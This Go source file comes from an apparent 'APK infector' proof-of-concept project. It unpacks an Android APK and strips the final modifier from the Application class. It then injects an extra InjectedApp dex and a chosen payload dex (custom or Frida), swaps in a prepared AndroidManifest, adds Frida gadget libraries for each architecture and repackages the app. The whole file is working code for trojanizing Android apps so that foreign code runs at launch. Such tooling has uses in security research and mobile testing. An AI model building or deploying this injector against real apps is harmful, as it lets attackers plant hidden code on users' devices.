package injector

import (
	"archive/zip"
	//"compress/flate"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
)

var zipOutput, _ = filepath.Abs("sample_unzipped")
var injectedAppPrevName, _ = filepath.Abs("InjectedApp_patched.dex")
var payload_custom_name, _ = filepath.Abs("payload_custom.dex")
var payload_frida_name, _ = filepath.Abs("payload_frida.dex")
var frida_gadget_path_arm64, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "arm64-v8a", os.PathSeparator, "libfrida-gadget.so"))
var frida_gadget_path_arm, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "armeabi-v7a", os.PathSeparator, "libfrida-gadget.so"))
var frida_gadget_path_x86, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "x86", os.PathSeparator, "libfrida-gadget.so"))
var frida_gadget_path_x64, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "x86_64", os.PathSeparator, "libfrida-gadget.so"))

//var lib_test_path, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "x86_64", os.PathSeparator, "libexample.so"))

// CopyFile copies a file from src to dst. If src and dst files exist, and are
// the same, then return success. Otherise, attempt to create a hard link
// between the two files. If that fail, copy the file contents from src to dst.
func CopyFile(src, dst string) (err error) {
	sfi, err := os.Stat(src)
	if err != nil {
		return
	}
	if !sfi.Mode().IsRegular() {
		// cannot copy non-regular files (e.g., directories,
		// symlinks, devices, etc.)
		return fmt.Errorf("CopyFile: non-regular source file %s (%q)", sfi.Name(), sfi.Mode().String())
	}
	dfi, err := os.Stat(dst)
	if err != nil {
		if !os.IsNotExist(err) {
			return
		}
	} else {
		if !(dfi.Mode().IsRegular()) {
			return fmt.Errorf("CopyFile: non-regular destination file %s (%q)", dfi.Name(), dfi.Mode().String())
		}
		if os.SameFile(sfi, dfi) {
			return
		}
	}
	if err = os.Link(src, dst); err == nil {
		return
	}
	err = copyFileContents(src, dst)
	return
}

// copyFileContents copies the contents of the file named src to the file named
// by dst. The file will be created if it does not already exist. If the
// destination file exists, all it's contents will be replaced by the contents
// of the source file.
func copyFileContents(src, dst string) (err error) {
	in, err := os.Open(src)
	if err != nil {
		return
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return
	}
	defer func() {
		cerr := out.Close()
		if err == nil {
			err = cerr
		}
	}()
	if _, err = io.Copy(out, in); err != nil {
		return
	}
	err = out.Sync()
	return
}

func Inject(path string, zipModifiedOutput string) {

	if _, err := os.Stat(zipOutput); err == nil {
		err := os.RemoveAll(zipOutput)
		if err != nil {
			log.Panic(err)
		}
	}
	if _, err := os.Stat(zipModifiedOutput); err == nil {
		err := os.Remove(zipModifiedOutput)
		if err != nil {
			log.Panic(err)
		}
	}

	//unzip apk
	files, err := unzip(path, zipOutput)
	if err != nil {
		log.Panic("Failed to unzip APK", err)
		//log.Printf("Unzipped:\n" + strings.Join(files, "\n"))
	}

	// patch out Application final modifier
	for _, path := range files {
		if strings.Contains(path, "classes") {
			dex.Patch_app_modifier(path)
		}
	}

	//calc classes.dex index
	max := strings.Count(strings.Join(files, ""), "classes")
	log.Printf("max classes dex index = %d", max)
	max += 1

	// inject InjectedApp.dex
	var injectedAppNewName = "classes" + strconv.Itoa(max) + ".dex"

	copy(injectedAppPrevName, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, injectedAppNewName))

	max += 1

	// inject payload.dex
	var payloadNewName = "classes" + strconv.Itoa(max) + ".dex"

	var payload_name string

	if (utils.Payload_option == int(utils.Custom_payload)) {
		payload_name = payload_custom_name
	} else if (utils.Payload_option == int(utils.Frida_payload)) {
		payload_name = payload_frida_name
	}

	copy(payload_name, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, payloadNewName))

	log.Printf("Successfuly injected DEX:" + injectedAppNewName + "," + payloadNewName)

	//replace manifest
	copy(utils.ManifestBinaryPath, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, "AndroidManifest.xml"))

	// inject frida gadget
	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-arm64.so"), frida_gadget_path_arm64)
	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-arm.so"), frida_gadget_path_arm)
	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-x86.so"), frida_gadget_path_x86)
	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-x86_64.so"), frida_gadget_path_x64)


	// // zip all files
	fmt.Println("\t--zipping...")
	ZipWriter(zipModifiedOutput)

	
}

func ZipWriter(zipModifiedOutput string) {
	baseFolder, _ := filepath.Abs("sample_unzipped")

	// Get a Buffer to Write To
	outFile, err := os.Create(zipModifiedOutput)
	if err != nil {
		fmt.Println(err)
	}
	defer outFile.Close()

	// Create a new zip archive.
	zipWriter := zip.NewWriter(outFile)
	defer zipWriter.Close()

	// Register a custom Deflate compressor.
	// w.RegisterCompressor(
	// 	//zip.Deflate,
	// 	zip.Store,
	// 	func(out io.Writer) (io.WriteCloser, error) {
	// 	//return flate.NewWriter(out, flate.BestCompression)
	// 	return flate.NewWriter(out, flate.NoCompression)
	// })

	// Добавляем файлы из каталога в ZIP архив
	err = filepath.Walk(baseFolder, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		return addFileToZip(zipWriter, path, baseFolder)
	})

	if err != nil {
		fmt.Println(err)
	}

}

func addFileToZip(zipWriter *zip.Writer, filename, baseDir string) error {
	// Открываем исходный файл
	fileToZip, err := os.Open(filename)
	if err != nil {
		return fmt.Errorf("failed to open file %s: %w", filename, err)
	}
	defer fileToZip.Close()

	// Получаем относительный путь файла для записи в ZIP архиве
	relPath, err := filepath.Rel(baseDir, filename)
	if err != nil {
		return fmt.Errorf("failed to get relative path for %s: %w", filename, err)
	}

	// Получаем информацию о файле
	info, err := fileToZip.Stat()
	if err != nil {
		return fmt.Errorf("failed to get file info for %s: %w", filename, err)
	}

	// Создаем заголовок файла в ZIP архиве
	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return fmt.Errorf("failed to create file header for %s: %w", filename, err)
	}
	header.Name = relPath

	// Проверяем, является ли файл библиотекой .so и устанавливаем метод хранения
	if filepath.Ext(filename) == ".so" || filepath.Ext(filename) == ".arsc" {
		header.Method = zip.Store
	} else {
		header.Method = zip.Deflate
	}

	// Создаем запись в ZIP архиве
	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return fmt.Errorf("failed to create zip header for %s: %w", filename, err)
	}

	// Копируем содержимое файла в запись ZIP архива
	if _, err := io.Copy(writer, fileToZip); err != nil {
		return fmt.Errorf("failed to copy file content for %s: %w", filename, err)
	}

	return nil
}

// func addFiles(w *zip.Writer, basePath, baseInZip string) {
// 	// Open the Directory
// 	files, err := os.ReadDir(basePath)
// 	if err != nil {
// 		fmt.Println(err)
// 	}

// 	for _, file := range files {
// 		//fmt.Println(basePath + file.Name())
// 		if !file.IsDir() {
// 			dat, err := os.ReadFile(fmt.Sprintf("%s%c%s", basePath, os.PathSeparator, file.Name()))
// 			if err != nil {
// 				fmt.Println(err)
// 			}

// 			// Add some files to the archive.
// 			f, err := w.Create(baseInZip + file.Name())
// 			if err != nil {
// 				fmt.Println(err)
// 			}
// 			_, err = f.Write(dat)
// 			if err != nil {
// 				fmt.Println(err)
// 			}
// 		} else if file.IsDir() {

// 			// Recurse
// 			newBase := fmt.Sprintf("%s%c%s", basePath, os.PathSeparator, file.Name())
// 			//fmt.Println("Recursing and Adding SubDir: " + file.Name())
// 			//fmt.Println("Recursing and Adding SubDir: " + newBase)

// 			recPath := fmt.Sprintf("%s%s%c", baseInZip, file.Name(), os.PathSeparator)
// 			addFiles(w, newBase, recPath)
// 		}
// 	}
// }

func copy(src, dst string) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		log.Panic("Failed to inject DEX", err)
	}

	if !sourceFileStat.Mode().IsRegular() {
		log.Panic("Failed to inject DEX", err)
	}

	source, err := os.Open(src)
	if err != nil {
		log.Panic("Failed to inject DEX", err)
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		log.Panic("Failed to inject DEX", err)
	}
	defer destination.Close()
	_, err = io.Copy(destination, source)
	if err != nil {
		log.Panic("Failed to inject DEX", err)
	}
}

// Unzip will decompress a zip archive, moving all files and folders
// within the zip file (parameter 1) to an output directory (parameter 2).
func unzip(src string, dest string) ([]string, error) {

	var filenames []string

	r, err := zip.OpenReader(src)
	if err != nil {
		return filenames, err
	}
	defer r.Close()

	for _, f := range r.File {

		// Store filename/path for returning and using later on
		fpath := filepath.Join(dest, f.Name)

		// Check for ZipSlip.
		if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
			return filenames, fmt.Errorf("%s: illegal file path", fpath)
		}

		filenames = append(filenames, fpath)

		if f.FileInfo().IsDir() {
			// Make Folder
			os.MkdirAll(fpath, os.ModePerm)
			continue
		}

		// Make File
		if err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
			return filenames, err
		}

		outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil {
			return filenames, err
		}

		rc, err := f.Open()
		if err != nil {
			return filenames, err
		}

		_, err = io.Copy(outFile, rc)

		// Close the file without defer to close before next iteration of loop
		outFile.Close()
		rc.Close()

		if err != nil {
			return filenames, err
		}
	}
	return filenames, nil
}
